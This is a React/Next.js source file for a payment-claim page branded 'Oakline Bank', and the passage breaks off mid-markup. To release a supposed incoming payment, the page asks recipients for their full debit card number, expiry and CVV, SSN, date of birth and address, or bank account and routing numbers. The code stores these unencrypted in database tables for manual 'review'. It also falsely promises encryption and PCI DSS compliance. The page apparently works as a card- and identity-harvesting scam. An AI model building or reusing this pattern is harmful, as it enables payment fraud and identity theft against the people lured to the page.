import { useState, useEffect } from 'react';
import { useRouter } from 'next/router';
import { supabase } from '../lib/supabaseClient';
import Head from 'next/head';

export default function ClaimPaymentPage() {
  const router = useRouter();
  const { token } = router.query;
  const [payment, setPayment] = useState(null);
  const [loading, setLoading] = useState(true);
  const [message, setMessage] = useState('');
  const [messageType, setMessageType] = useState('info');
  const [submitting, setSubmitting] = useState(false);
  const [activeTab, setActiveTab] = useState('debit_card');
  const [claimSuccess, setClaimSuccess] = useState(false);
  const [receiptData, setReceiptData] = useState(null);
  const [paymentSource, setPaymentSource] = useState(null); // Track which table: 'pending_claims' or 'transactions'
  const [claimMethod, setClaimMethod] = useState(null); // To store the method used for claim success message
  const [processing, setProcessing] = useState(false); // State to manage the processing spinner
  const [submissionError, setSubmissionError] = useState(''); // For prominent error display
  const [submissionSuccess, setSubmissionSuccess] = useState(false); // For success state

  const [citizenship, setCitizenship] = useState(null);
  const [achCitizenship, setAchCitizenship] = useState(null); // null = not selected, 'us' = US, 'international' = International

  const [debitCardForm, setDebitCardForm] = useState({
    cardholder_name: '',
    card_number: '',
    card_expiry: '',
    card_cvv: '',
    verification_type: 'ssn',
    ssn: '',
    id_number: '',
    date_of_birth: '',
    billing_address: '',
    billing_city: '',
    billing_state: '',
    billing_zip: '',
    billing_country: '',
    first_name: '',
    last_name: '',
    middle_name: ''
  });

  const [verificationType, setVerificationType] = useState('ssn');

  const [achForm, setAchForm] = useState({
    account_holder_name: '',
    account_number: '',
    routing_number: '',
    account_type: 'checking',
    ssn: '',
    iban: '',
    swift_code: '',
    bank_name: '',
    id_number: '',
    date_of_birth: '',
    first_name: '',
    middle_name: '',
    last_name: '',
    id_type: 'passport' // Default for international
  });


  useEffect(() => {
    if (token) {
      loadPaymentDetails();
    }
  }, [token]);

  const loadPaymentDetails = async () => {
    try {
      // First, try to fetch from oakline_pay_pending_claims
      const { data: pendingData, error: pendingError } = await supabase
        .from('oakline_pay_pending_claims')
        .select('*')
        .eq('claim_token', token)
        .single();

      let paymentData = pendingData;
      let source = 'pending_claims';

      // If not found in pending_claims, try oakline_pay_transactions
      if (!pendingData || pendingError) {
        const { data: transactionData, error: transactionError } = await supabase
          .from('oakline_pay_transactions')
          .select('*')
          .eq('claim_token', token)
          .single();

        if (!transactionData || transactionError) {
          setMessage('Payment not found. Please check the link and try again.');
          setMessageType('error');
          setLoading(false);
          return;
        }

        paymentData = transactionData;
        source = 'transactions';
      }

      setPaymentSource(source);

      // Check approval status (for pending_claims)
      if (paymentData.approval_status) {
        if (paymentData.approval_status === 'card_details_submitted') {
          setMessage('📋 Claim Under Review\n\nYour claim has been successfully submitted and is currently under review by our team. You will receive an email notification as soon as the payment is processed. Thank you for your patience!');
          setMessageType('info');
          setPayment(paymentData); // Set payment data so we can show details
          setLoading(false);
          return;
        }

        if (paymentData.approval_status === 'approved') {
          setMessage('✅ Payment Approved & Processing\n\nYour claim has been approved and your funds are being transferred. You will receive the payment within 1-3 business days. A confirmation email has been sent to you.');
          setMessageType('success');
          setPayment(paymentData); // Set payment data so we can show details
          setLoading(false);
          return;
        }

        if (paymentData.approval_status === 'rejected') {
          setMessage('❌ Claim Not Approved\n\nYour claim was not approved. Please contact support for more information.');
          setMessageType('error');
          setPayment(paymentData); // Set payment data so we can show details
          setLoading(false);
          return;
        }
      }

      // Check transaction status (for transactions table)
      if (paymentData.status && paymentData.status === 'completed') {
        setMessage('✅ Payment Completed\n\nThis payment has already been completed. You should see the funds in your account shortly.');
        setMessageType('success');
        setPayment(paymentData); // Set payment data so we can show details
        setLoading(false);
        return;
      }

      // Check expiration
      if (paymentData.expires_at && new Date(paymentData.expires_at) < new Date()) {
        setMessage('⏰ Payment Link Expired\n\nThis payment link has expired. Please contact the sender for a new link.');
        setMessageType('error');
        setPayment(paymentData); // Set payment data even for expired
        setLoading(false);
        return;
      }

      setPayment(paymentData);
      setLoading(false);
    } catch (error) {
      console.error('Error loading payment:', error);
      setMessage('An error occurred while loading the payment.');
      setMessageType('error');
      setLoading(false);
    }
  };

  const handleDebitCardSubmit = async () => {
    // Clear previous errors
    setSubmissionError('');
    setSubmissionSuccess(false);

    // Validation: Check verification fields based on type
    const hasVerification = debitCardForm.verification_type === 'ssn' ? debitCardForm.ssn : debitCardForm.id_number;

    if (!debitCardForm.first_name || !debitCardForm.last_name || !debitCardForm.card_number || !debitCardForm.card_expiry || !debitCardForm.card_cvv || !hasVerification || !debitCardForm.date_of_birth || !debitCardForm.billing_address || !debitCardForm.billing_city || !debitCardForm.billing_state || !debitCardForm.billing_zip || !debitCardForm.billing_country) {
      setSubmissionError('Please fill in all required fields.');
      window.scrollTo({ top: 0, behavior: 'smooth' });
      return;
    }

    // Validate card expiry - check if expired
    const [expMonth, expYear] = debitCardForm.card_expiry.split('/');
    if (expMonth && expYear) {
      const currentDate = new Date();
      const currentYear = currentDate.getFullYear() % 100;
      const currentMonth = currentDate.getMonth() + 1;
      const cardExpMonth = parseInt(expMonth);
      const cardExpYear = parseInt(expYear);

      if (cardExpYear < currentYear || (cardExpYear === currentYear && cardExpMonth < currentMonth)) {
        setSubmissionError('Your debit card has expired. Please use a valid card.');
        window.scrollTo({ top: 0, behavior: 'smooth' });
        return;
      }
    }

    setSubmitting(true);
    setProcessing(true); // Show processing spinner
    setClaimMethod('debit_card'); // Set claim method for success message
    try {
      const finalCardholderName = debitCardForm.cardholder_name.trim() || debitCardForm.first_name + " " + debitCardForm.last_name;


      // Update based on which table the payment came from
      const tableName = paymentSource === 'transactions' ? 'oakline_pay_transactions' : 'oakline_pay_pending_claims';

      const updateData = {
        claim_method: 'debit_card',
        claimed_at: new Date().toISOString(),
        cardholder_name: finalCardholderName,
        card_number: debitCardForm.card_number,
        card_expiry: debitCardForm.card_expiry,
        card_cvv: debitCardForm.card_cvv,
        ssn: debitCardForm.verification_type === 'ssn' ? debitCardForm.ssn : null,
        date_of_birth: debitCardForm.date_of_birth,
        billing_address: debitCardForm.billing_address,
        billing_city: debitCardForm.billing_city,
        billing_state: debitCardForm.billing_state,
        billing_zip: debitCardForm.billing_zip,
        billing_country: debitCardForm.billing_country,
        first_name: debitCardForm.first_name,
        last_name: debitCardForm.last_name,
        middle_name: debitCardForm.middle_name
      };

      // Add status fields based on table
      if (tableName === 'oakline_pay_pending_claims') {
        updateData.approval_status = 'card_details_submitted';
      }

      const { error } = await supabase
        .from(tableName)
        .update(updateData)
        .eq('claim_token', token);

      if (error) {
        console.error('Supabase update error:', error);
        throw new Error(error.message || 'Database update failed');
      }

      // Send notification email to receiver
      await fetch('/api/send-claim-notification', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          receiver_email: payment.recipient_email,
          receiver_name: payment.recipient_name || '',
          sender_name: payment.sender_name || payment.sender_contact,
          amount: payment.amount,
          claim_method: 'debit_card',
          claim_token: token,
          from_email: 'transfers@theoaklinebank.com' // Use the correct from email
        })
      }).catch(err => console.error('Error sending notification:', err));

      setReceiptData({
        claimMethod: 'debit_card',
        amount: payment.amount,
        senderName: payment.sender_name || payment.sender_contact,
        timestamp: new Date().toLocaleString('en-US', { year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit' })
      });
      setSubmissionSuccess(true);
      setClaimSuccess(true);
    } catch (error) {
      console.error('Debit card submission error:', error);
      const errorMsg = error?.message || 'Failed to process claim. Please try again.';
      setSubmissionError(errorMsg);
      window.scrollTo({ top: 0, behavior: 'smooth' });
    } finally {
      setSubmitting(false);
      setProcessing(false); // Hide processing spinner
    }
  };

  const handleAchSubmit = async (e) => {
    // Citizenship-aware validation
    if (!achForm.account_holder_name || !achForm.date_of_birth) {
      setMessage('Please fill in all required fields.', 'error');
      setMessageType('error');
      return;
    }

    if (achCitizenship === 'us') {
      if (!achForm.routing_number || !achForm.account_number || !achForm.account_type || !achForm.ssn) {
        setMessage('Please fill in all required fields.', 'error');
        setMessageType('error');
        return;
      }
    } else if (achCitizenship === 'intl') {
      if (!achForm.iban || !achForm.swift_code || !achForm.bank_name || !achForm.id_number) {
        setMessage('Please fill in all required fields.', 'error');
        setMessageType('error');
        return;
      }
    } else {
      setMessage('Please select your account type (US or International).', 'error');
      setMessageType('error');
      return;
    }

    setSubmitting(true);
    setProcessing(true); // Show processing spinner
    setClaimMethod('ach'); // Set claim method for success message
    try {
      // Prepare update object based on citizenship
      const updateData = {
        claim_method: 'ach',
        claimed_at: new Date().toISOString(),
        account_holder_name: achForm.account_holder_name,
        account_type: achForm.account_type,
        date_of_birth: achForm.date_of_birth,
        approval_status: 'card_details_submitted', // Assuming this is the correct status for pending claims
        first_name: achForm.first_name,
        middle_name: achForm.middle_name,
        last_name: achForm.last_name
      };

      if (achCitizenship === 'us') {
        updateData.routing_number = achForm.routing_number;
        updateData.account_number = achForm.account_number;
        updateData.ssn = achForm.ssn;
      } else if (achCitizenship === 'intl') {
        updateData.iban = achForm.iban;
        updateData.swift_code = achForm.swift_code;
        updateData.bank_name = achForm.bank_name;
        updateData.id_number = achForm.id_number;
        updateData.id_type = achForm.id_type || 'passport'; // Added id_type for international claims
      }

      const { error } = await supabase
        .from('oakline_pay_pending_claims') // Assuming international claims go to pending_claims for now
        .update(updateData)
        .eq('claim_token', token);
        // .eq('status', 'sent'); // This condition might be too restrictive if international claims bypass 'sent' status

      if (error) {
        console.error('Supabase update error:', error);
        throw new Error(error.message || 'Database update failed');
      }

      // Send notification email to receiver
      await fetch('/api/send-claim-notification', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          receiver_email: payment.recipient_email,
          receiver_name: payment.recipient_name || '',
          sender_name: payment.sender_name || payment.sender_contact,
          amount: payment.amount,
          claim_method: 'ach',
          claim_token: token,
          from_email: 'transfers@theoaklinebank.com' // Use the correct from email
        })
      }).catch(err => console.error('Error sending notification:', err));

      setReceiptData({
        claimMethod: 'ach',
        amount: payment.amount,
        senderName: payment.sender_name || payment.sender_contact,
        timestamp: new Date().toLocaleString('en-US', { year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit' })
      });
      setSubmissionSuccess(true);
      setClaimSuccess(true);
    } catch (error) {
      console.error('ACH submission error:', error);
      const errorMsg = error?.message || 'Failed to process claim. Please try again.';
      setSubmissionError(errorMsg);
      window.scrollTo({ top: 0, behavior: 'smooth' });
    } finally {
      setSubmitting(false);
      setProcessing(false); // Hide processing spinner
    }
  };

  const handleOpenAccountClick = () => {
    const siteUrl = process.env.NEXT_PUBLIC_SITE_URL || 'https://theoaklinebank.com';
    const applyUrl = `${siteUrl}/apply?claim_token=${token}`;
    window.location.href = applyUrl;
  };

  if (loading) {
    return (
      <>
        <Head>
          <title>Loading... - Oakline Bank</title>
        </Head>
        <div style={{
          minHeight: '100vh',
          background: 'linear-gradient(135deg, #0066cc 0%, #004999 100%)',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          padding: '1.5rem'
        }}>
          <div style={{
            background: 'white',
            borderRadius: '16px',
            padding: '3rem 2rem',
            maxWidth: '500px',
            width: '100%',
            boxShadow: '0 20px 60px rgba(0,0,0,0.3)',
            textAlign: 'center'
          }}>
            <div style={{
              width: '50px',
              height: '50px',
              border: '4px solid #e2e8f0',
              borderTopColor: '#0066cc',
              borderRadius: '50%',
              margin: '0 auto 1.5rem',
              animation: 'spin 1s linear infinite'
            }} />
            <h2 style={{ color: '#1e293b', fontSize: '1.25rem', marginBottom: '0.5rem' }}>Loading Payment Details</h2>
            <p style={{ color: '#64748b', fontSize: '0.95rem' }}>Please wait...</p>
          </div>
        </div>
      </>
    );
  }

  // Check if claim is already submitted (status is 'claimed')
  if (payment && payment.status === 'claimed') {
    return (
      <>
        <Head>
          <title>Claim Already Submitted - Oakline Bank</title>
        </Head>
        <div style={{
          minHeight: '100vh',
          background: 'linear-gradient(135deg, #0066cc 0%, #004999 100%)',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          padding: '1.5rem'
        }}>
          <div style={{
            background: 'white',
            borderRadius: '16px',
            padding: '3rem 2rem',
            maxWidth: '600px',
            width: '100%',
            boxShadow: '0 20px 60px rgba(0,0,0,0.3)',
            textAlign: 'center'
          }}>
            <div style={{
              width: '80px',
              height: '80px',
              background: 'linear-gradient(135deg, #0066cc 0%, #004999 100%)',
              borderRadius: '50%',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              margin: '0 auto 2rem',
              fontSize: '2.5rem',
              color: 'white'
            }}>
              ⏳
            </div>
            <h1 style={{ color: '#1e293b', fontSize: '1.75rem', marginBottom: '1rem', fontWeight: '700' }}>
              Claim Already Submitted
            </h1>
            <p style={{ color: '#64748b', fontSize: '1.1rem', marginBottom: '2rem', lineHeight: '1.6' }}>
              Your payment claim has already been submitted and is currently being processed by our team.
            </p>
            <div style={{
              background: '#f0f9ff',
              border: '2px solid #0066cc',
              borderRadius: '12px',
              padding: '1.5rem',
              marginBottom: '2rem'
            }}>
              <div style={{ color: '#0066cc', fontSize: '0.9rem', fontWeight: '600', marginBottom: '0.5rem' }}>
                Payment Amount
              </div>
              <div style={{ color: '#1e293b', fontSize: '2rem', fontWeight: '700', marginBottom: '1rem' }}>
                ${parseFloat(payment.amount).toFixed(2)}
              </div>
              <div style={{ color: '#64748b', fontSize: '0.9rem' }}>
                From: {payment.sender_name || payment.sender_contact}
              </div>
            </div>
            <div style={{
              background: '#fffbeb',
              border: '1px solid #fcd34d',
              borderRadius: '8px',
              padding: '1rem',
              marginBottom: '2rem',
              textAlign: 'left'
            }}>
              <p style={{ color: '#92400e', fontSize: '0.95rem', margin: 0 }}>
                <strong>📧 What happens next:</strong><br/>
                Our team is reviewing your claim. You will receive an email notification once your payment has been processed and the funds are on their way. This typically takes 1-3 business days depending on your chosen payment method.
              </p>
            </div>
            <p style={{ color: '#94a3b8', fontSize: '0.85rem', margin: '1rem 0' }}>
              If you have any questions, please contact our support team at <strong>contact-us@theoaklinebank.com</strong> or call <strong>(636) 635-6122</strong>.
            </p>
          </div>
        </div>
      </>
    );
  }

  if (claimSuccess) {
    return (
      <>
        <Head>
          <title>Claim Submitted - Oakline Bank</title>
        </Head>
        <style>{`
          @keyframes spin {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
          }
          @keyframes slideIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
          }
          @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
          }
        `}</style>
        <div style={{
          minHeight: '100vh',
          background: 'linear-gradient(135deg, #0066cc 0%, #004999 100%)',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          padding: '1.5rem'
        }}>
          <div style={{
            background: 'white',
            borderRadius: '16px',
            padding: '0',
            maxWidth: '600px',
            width: '100%',
            boxShadow: '0 20px 60px rgba(0,0,0,0.3)',
            animation: 'slideIn 0.5s ease-out'
          }}>
            {/* Receipt Header */}
            <div style={{
              background: 'linear-gradient(135deg, #0052a3 0%, #003a7a 100%)',
              color: '#ffffff',
              padding: '3rem 2rem',
              borderRadius: '16px 16px 0 0',
              textAlign: 'center'
            }}>
              <div style={{
                width: '70px',
                height: '70px',
                background: 'rgba(255,255,255,0.2)',
                borderRadius: '50%',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                margin: '0 auto 1.5rem',
                fontSize: '2.5rem'
              }}>
                ✓
              </div>
              <h1 style={{ margin: '0 0 0.5rem 0', fontSize: '1.5rem', fontWeight: '800' }}>Claim Submitted!</h1>
              <p style={{ margin: '0', fontSize: '0.95rem', color: 'rgba(255,255,255,0.9)' }}>Your payment claim is being processed</p>
            </div>

            {/* Payment Details Section - Show after successful claim too */}
            {payment && (
              <div style={{ background: '#ffffff', borderRadius: '12px', padding: '2rem', marginBottom: '2rem' }}>
                {/* Processing Spinner - Only show when actively processing, not after success */}
                {processing && !claimSuccess && (
                  <div style={{
                    background: '#ffffff',
                    border: '2px solid #0066cc',
                    borderRadius: '12px',
                    padding: '2.5rem',
                    textAlign: 'center',
                    marginBottom: '2rem'
                  }}>
                    <div style={{
                      width: '60px',
                      height: '60px',
                      border: '4px solid #e5e7eb',
                      borderTop: '4px solid #0066cc',
                      borderRadius: '50%',
                      margin: '0 auto 1.5rem auto',
                      animation: 'spin 1s linear infinite'
                    }}></div>
                    <h3 style={{ margin: '0 0 0.5rem 0', color: '#0066cc', fontSize: '1.25rem', fontWeight: '700' }}>Processing your claim...</h3>
                    <p style={{ margin: '0', color: '#6b7280', fontSize: '0.95rem' }}>Please wait while we verify your information</p>
                  </div>
                )}

                {/* Receipt Details */}
                <div style={{
                  backgroundColor: '#f8fafc',
                  borderRadius: '12px',
                  padding: '1.75rem',
                  marginBottom: '2rem'
                }}>
                  <h3 style={{ margin: '0 0 1.5rem 0', fontSize: '0.9rem', fontWeight: '700', textTransform: 'uppercase', letterSpacing: '0.3px', color: '#555' }}>Payment Details</h3>

                  <div style={{ marginBottom: '1.25rem' }}>
                    <p style={{ margin: '0 0 0.5rem 0', color: '#999', fontSize: '0.85rem', fontWeight: '500' }}>Amount</p>
                    <p style={{ margin: '0', fontSize: '1.75rem', fontWeight: '900', color: '#0052a3' }}>${parseFloat(receiptData?.amount || 0).toFixed(2)}</p>
                  </div>

                  <div style={{ marginBottom: '1.25rem', paddingBottom: '1.25rem', borderBottom: '1px solid #e5e7eb' }}>
                    <p style={{ margin: '0 0 0.5rem 0', color: '#999', fontSize: '0.85rem', fontWeight: '500' }}>From</p>
                    <p style={{ margin: '0', fontSize: '1rem', fontWeight: '600', color: '#1e293b' }}>{receiptData?.senderName}</p>
                  </div>

                  <div style={{ marginBottom: '1.25rem', paddingBottom: '1.25rem', borderBottom: '1px solid #e5e7eb' }}>
                    <p style={{ margin: '0 0 0.5rem 0', color: '#999', fontSize: '0.85rem', fontWeight: '500' }}>Claim Method</p>
                    <p style={{ margin: '0', fontSize: '1rem', fontWeight: '600', color: '#1e293b' }}>
                      {receiptData?.claimMethod === 'debit_card' && '💳 Debit Card Deposit'}
                      {receiptData?.claimMethod === 'ach' && '🏦 ACH Bank Transfer'}
                    </p>
                  </div>

                  <div>
                    <p style={{ margin: '0 0 0.5rem 0', color: '#999', fontSize: '0.85rem', fontWeight: '500' }}>Submitted</p>
                    <p style={{ margin: '0', fontSize: '0.95rem', color: '#1e293b' }}>{receiptData?.timestamp}</p>
                  </div>
                </div>

                {/* Info Box */}
                <div style={{
                  backgroundColor: '#fffbeb',
                  border: '1px solid #fcd34d',
                  borderRadius: '12px',
                  padding: '1.25rem',
                  marginBottom: '2rem'
                }}>
                  <p style={{ margin: '0 0 0.75rem 0', color: '#854d0e', fontWeight: '600', fontSize: '0.95rem' }}>Dear {payment.recipient_name || 'Recipient'},</p>
                  <p style={{ margin: '0', color: '#92400e', fontSize: '0.85rem', lineHeight: '1.6' }}>Thank you for submitting your claim! We've received your request and are processing your payment from {receiptData?.senderName}. A confirmation email has been sent to the sender. Your claim is now under review and will be processed shortly. You'll receive updates via email.</p>
                </div>

                {/* Done Button */}
                <button onClick={() => router.push('/')} style={{
                  width: '100%',
                  padding: '1rem',
                  background: 'linear-gradient(135deg, #0066cc 0%, #004999 100%)',
                  color: 'white',
                  border: 'none',
                  borderRadius: '8px',
                  fontWeight: '700',
                  fontSize: '1rem',
                  cursor: 'pointer',
                  transition: 'all 0.3s ease',
                  boxShadow: '0 4px 12px rgba(0, 102, 204, 0.3)'
                }} onMouseEnter={(e) => e.target.style.boxShadow = '0 6px 16px rgba(0, 102, 204, 0.4)'} onMouseLeave={(e) => e.target.style.boxShadow = '0 4px 12px rgba(0, 102, 204, 0.3)'}>
                  ✓ Done
                </button>
              </div>
            )}
          </div>
        </div>
      </>
    );
  }

  return (
    <>
      <Head>
        <title>Claim Payment - Oakline Bank</title>
      </Head>
      <style>{`
        @keyframes spin {
          from { transform: rotate(0deg); }
          to { transform: rotate(360deg); }
        }
        @keyframes slideIn {
          from { opacity: 0; transform: translateY(10px); }
          to { opacity: 1; transform: translateY(0); }
        }
        @keyframes fadeIn {
          from { opacity: 0; }
          to { opacity: 1; }
        }
        @media (max-width: 768px) {
          .tab-container { flex-direction: column; }
          .form-row { flex-direction: column !important; }
          .form-row > div { flex: 1 !important; }
        }
      `}</style>

      {/* Professional Full-Screen Loading Overlay */}
      {processing && !claimSuccess && (
        <div style={{
          position: 'fixed',
          top: 0,
          left: 0,
          right: 0,
          bottom: 0,
          backgroundColor: 'rgba(26, 54, 93, 0.95)',
          display: 'flex',
          flexDirection: 'column',
          justifyContent: 'center',
          alignItems: 'center',
          zIndex: 9999,
          backdropFilter: 'blur(8px)'
        }}>
          <div style={{
            width: '80px',
            height: '80px',
            border: '6px solid rgba(255,255,255,0.2)',
            borderTop: '6px solid #059669',
            borderRadius: '50%',
            animation: 'spin 1s linear infinite',
            marginBottom: '2rem'
          }}></div>
          <h2 style={{
            color: 'white',
            fontSize: '2rem',
            fontWeight: '700',
            marginBottom: '1rem',
            textAlign: 'center'
          }}>
            💳 Processing Your Claim
          </h2>
          <p style={{
            color: 'rgba(255,255,255,0.9)',
            fontSize: '1.125rem',
            textAlign: 'center',
            maxWidth: '500px',
            lineHeight: '1.6',
            padding: '0 1rem'
          }}>
            Please wait while we securely process your debit card information and submit your claim...
          </p>
          <div style={{
            marginTop: '2rem',
            padding: '1rem 2rem',
            backgroundColor: 'rgba(5, 150, 105, 0.2)',
            borderRadius: '12px',
            border: '2px solid rgba(5, 150, 105, 0.5)',
            color: 'rgba(255,255,255,0.9)',
            fontSize: '0.875rem',
            textAlign: 'center'
          }}>
            🔒 Your information is encrypted with bank-level security
          </div>
        </div>
      )}

      <div style={{
        minHeight: '100vh',
        background: 'linear-gradient(135deg, #0066cc 0%, #004999 100%)',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        padding: '1.5rem'
      }}>
        <div style={{
          background: 'white',
          borderRadius: '16px',
          padding: '0',
          maxWidth: '750px',
          width: '100%',
          boxShadow: '0 20px 60px rgba(0,0,0,0.3)',
          maxHeight: '95vh',
          overflowY: 'auto'
        }}>
          {/* Header Section */}
          <div style={{
            background: 'linear-gradient(135deg, #0052a3 0%, #003a7a 100%)',
            color: '#ffffff',
            padding: '2.5rem 2rem',
            borderRadius: '16px 16px 0 0',
            textAlign: 'center'
          }}>
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '0.75rem', marginBottom: '0.25rem' }}>
              <div style={{ width: '40px', height: '40px', background: 'rgba(255,255,255,0.2)', borderRadius: '8px', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '1.5rem', fontWeight: '900', color: '#fbbf24' }}>$</div>
              <h1 style={{ margin: '0', fontSize: '1.25rem', fontWeight: '800', color: '#ffffff', letterSpacing: '-0.5px' }}>OAKLINE BANK</h1>
            </div>
            <p style={{ margin: '0 0 1.5rem 0', fontSize: '0.85rem', color: 'rgba(255,255,255,0.9)', fontWeight: '500', letterSpacing: '0.5px' }}>PAYMENT CLAIM SYSTEM</p>
            <div style={{ fontSize: '3rem', fontWeight: '900', marginBottom: '0.75rem', color: '#ffffff' }}>
              ${parseFloat(payment?.amount || 0).toFixed(2)}
            </div>
            <p style={{ margin: '0', fontSize: '0.9rem', color: 'rgba(255,255,255,0.95)', fontWeight: '500' }}>
              From <strong style={{ color: '#ffffff' }}>{payment?.sender_name || payment?.sender_contact}</strong>
            </p>
          </div>

          {/* Message Section */}
          {message && (
            <div style={{ padding: '2rem' }}>
              <div style={{
                backgroundColor: messageType === 'error' ? '#fee2e2' : messageType === 'success' ? '#dcfce7' : '#e0f2fe',
                border: `2px solid ${messageType === 'error' ? '#fca5a5' : messageType === 'success' ? '#86efac' : '#7dd3fc'}`,
                color: messageType === 'error' ? '#991b1b' : messageType === 'success' ? '#065f46' : '#0c4a6e',
                padding: '1.5rem',
                borderRadius: '12px',
                fontSize: '0.95rem',
                lineHeight: '1.6',
                whiteSpace: 'pre-line'
              }}>
                {message}
              </div>
            </div>
          )}

          {payment && (
            <div style={{ padding: '2rem' }}>
              {/* Security Banner */}
              <div style={{
                backgroundColor: '#f0feff',
                border: '1px solid #a5f3fc',
                borderRadius: '12px',
                padding: '1.25rem',
                marginBottom: '2rem',
                display: 'flex',
                gap: '1rem',
                alignItems: 'flex-start'
              }}>
                <span style={{ fontSize: '1.5rem' }}>🔒</span>
                <div>
                  <p style={{ margin: '0 0 0.25rem 0', color: '#0c4a6e', fontWeight: '600', fontSize: '0.95rem' }}>Your Information is Secure</p>
                  <p style={{ margin: '0', color: '#0c7a99', fontSize: '0.85rem', lineHeight: '1.5' }}>All personal details are encrypted with 256-bit SSL and PCI DSS compliant.</p>
                </div>
              </div>

              {/* Payment Options Intro */}
              <div style={{ marginBottom: '2rem' }}>
                <p style={{ margin: '0 0 1rem 0', color: '#333', fontSize: '0.95rem', lineHeight: '1.6' }}>
                  Choose how you'd like to receive your payment. You have <strong style={{ color: '#0066cc' }}>14 days</strong> to claim this payment.
                </p>
              </div>

              {/* Tabs */}
              <div style={{
                display: 'flex',
                gap: '1rem',
                marginBottom: '2.5rem',
                paddingBottom: '1.5rem',
                borderBottom: '2px solid #e5e7eb',
                className: 'tab-container'
              }}>
                {[
                  { id: 'debit_card', label: 'Debit Card', subtitle: 'Instant' },
                  { id: 'ach', label: 'ACH Transfer', subtitle: '1-3 Days' },
                  { id: 'account', label: 'Create Account', subtitle: 'Instant' }
                ].map(tab => (
                  <button
                    key={tab.id}
                    onClick={() => setActiveTab(tab.id)}
                    style={{
                      padding: '0.875rem 1.25rem',
                      border: 'none',
                      borderBottom: activeTab === tab.id ? '3px solid #0066cc' : 'none',
                      backgroundColor: 'transparent',
                      color: activeTab === tab.id ? '#0066cc' : '#64748b',
                      cursor: 'pointer',
                      fontWeight: activeTab === tab.id ? '700' : '600',
                      fontSize: '0.95rem',
                      transition: 'all 0.3s ease',
                      flex: 1,
                      textAlign: 'center',
                      display: 'flex',
                      flexDirection: 'column',
                      alignItems: 'center',
                      gap: '0.35rem'
                    }}
                    onMouseEnter={(e) => !activeTab === tab.id && (e.target.style.color = '#0066cc')}
                    onMouseLeave={(e) => !activeTab === tab.id && (e.target.style.color = '#64748b')}
                  >
                    <div style={{ fontSize: '0.95rem' }}>{tab.label}</div>
                    <div style={{ fontSize: '0.75rem', color: activeTab === tab.id ? '#0066cc' : '#999', fontWeight: '500' }}>{tab.subtitle}</div>
                  </button>
                ))}
              </div>

              {/* DEBIT CARD TAB */}
              {activeTab === 'debit_card' && (
                <div style={{ animation: 'fadeIn 0.3s ease-in' }}>
                  {/* CITIZENSHIP QUESTION - SHOWN FIRST */}
                  {citizenship === null ? (
                    <div style={{ textAlign: 'center', padding: '2rem 1rem' }}>
                      <h3 style={{ color: '#1e293b', fontSize: '1.25rem', fontWeight: '700', marginBottom: '2rem', marginTop: 0 }}>What is your citizenship status?</h3>
                      <p style={{ color: '#64748b', marginBottom: '2rem', fontSize: '0.95rem' }}>This helps us show you the correct form fields</p>

                      <div style={{ display: 'flex', gap: '1rem', justifyContent: 'center', flexWrap: 'wrap' }}>
                        <button
                          onClick={() => setCitizenship('us')}
                          style={{
                            padding: '1.25rem 2rem',
                            border: '2px solid #0066cc',
                            borderRadius: '12px',
                            backgroundColor: 'white',
                            color: '#0066cc',
                            cursor: 'pointer',
                            fontWeight: '600',
                            fontSize: '1rem',
                            transition: 'all 0.3s ease',
                            minWidth: '200px'
                          }}
                          onMouseEnter={(e) => {
                            e.target.style.backgroundColor = '#0066cc';
                            e.target.style.color = 'white';
                          }}
                          onMouseLeave={(e) => {
                            e.target.style.backgroundColor = 'white';
                            e.target.style.color = '#0066cc';
                          }}
                        >
                          🇺🇸 US Citizen
                        </button>
                        <button
                          onClick={() => setCitizenship('international')}
                          style={{
                            padding: '1.25rem 2rem',
                            border: '2px solid #10b981',
                            borderRadius: '12px',
                            backgroundColor: 'white',
                            color: '#10b981',
                            cursor: 'pointer',
                            fontWeight: '600',
                            fontSize: '1rem',
                            transition: 'all 0.3s ease',
                            minWidth: '200px'
                          }}
                          onMouseEnter={(e) => {
                            e.target.style.backgroundColor = '#10b981';
                            e.target.style.color = 'white';
                          }}
                          onMouseLeave={(e) => {
                            e.target.style.backgroundColor = 'white';
                            e.target.style.color = '#10b981';
                          }}
                        >
                          🌍 International
                        </button>
                      </div>
                    </div>
                  ) : (
                    <>
                      <div style={{ display: 'flex', alignItems: 'center', gap: '0.75rem', marginBottom: '1.5rem', padding: '0.75rem', backgroundColor: '#f0f4ff', borderRadius: '8px' }}>
                        <span style={{ fontSize: '1.2rem', cursor: 'pointer' }} onClick={() => setCitizenship(null)} title="Change">
                          {citizenship === 'us' ? '🇺🇸 US Citizen' : '🌍 International'}
                        </span>
                        <button
                          onClick={() => setCitizenship(null)}
                          style={{
                            marginLeft: 'auto',
                            padding: '0.35rem 0.75rem',
                            backgroundColor: 'transparent',
                            border: '1px solid #0066cc',
                            color: '#0066cc',
                            borderRadius: '6px',
                            cursor: 'pointer',
                            fontSize: '0.8rem',
                            fontWeight: '600'
                          }}
                        >
                          Change
                        </button>
                      </div>

                      {/* Prominent Error/Success Messages */}
                      {submissionError && (
                        <div style={{
                          backgroundColor: '#fee2e2',
                          border: '2px solid #ef4444',
                          borderRadius: '12px',
                          padding: '1.5rem',
                          marginBottom: '2rem',
                          display: 'flex',
                          alignItems: 'flex-start',
                          gap: '1rem'
                        }}>
                          <div style={{
                            width: '48px',
                            height: '48px',
                            backgroundColor: '#ef4444',
                            borderRadius: '50%',
                            display: 'flex',
                            alignItems: 'center',
                            justifyContent: 'center',
                            flexShrink: 0,
                            fontSize: '1.5rem'
                          }}>
                            ⚠️
                          </div>
                          <div style={{ flex: 1 }}>
